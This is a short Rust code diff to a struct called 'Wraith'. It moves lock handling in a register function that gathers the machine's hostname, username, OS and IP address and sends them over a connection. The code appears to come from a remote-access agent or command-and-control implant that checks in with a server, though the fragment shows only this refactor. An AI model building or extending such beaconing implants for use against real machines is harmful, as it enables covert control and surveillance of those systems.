@@ -302,15 +302,12 @@ impl Wraith {
     }
 
     async fn register(&mut self) -> Result<(), Box<dyn std::error::Error>> {
-        let state = self.state.lock().unwrap();
-        let msg = MessageCodec::create_registration(
-            state.hostname.clone(),
-            state.username.clone(),
-            state.os.clone(),
-            state.ip_address.clone(),
-        );
-        drop(state);
+        let (hostname, username, os, ip_address) = {
+            let state = self.state.lock().unwrap();
+            (state.hostname.clone(), state.username.clone(), state.os.clone(), state.ip_address.clone())
+        };
 
+        let msg = MessageCodec::create_registration(hostname, username, os, ip_address);
         if let Some(conn) = &mut self.connection {
             conn.send_message(&msg).await?;
             info!("Registration sent");
